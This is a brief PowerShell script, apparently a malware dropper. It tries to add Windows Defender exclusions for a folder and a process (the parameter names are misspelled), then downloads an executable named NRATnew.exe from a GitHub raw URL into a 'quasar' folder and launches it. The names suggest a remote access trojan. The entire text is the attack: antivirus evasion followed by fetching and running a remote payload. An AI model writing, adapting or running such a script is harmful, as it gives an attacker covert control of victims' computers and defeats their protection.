Add-MpPreference -ExclusionPrcoess "NRATnew.exe"
Add-MpPreference -ExlcusionPath "C:\ProgramData\zDATAxD"
mkdir C:\ProgramData\zDATAxD
cd C:\programdata\zdataxd
mkdir quasar
cd quasar
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe'
$destination = 'C:\ProgramData\zDATAxD\quasar\NRATnew.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
start C:\programdata\zdataxd\quasar\NRATnew.exe
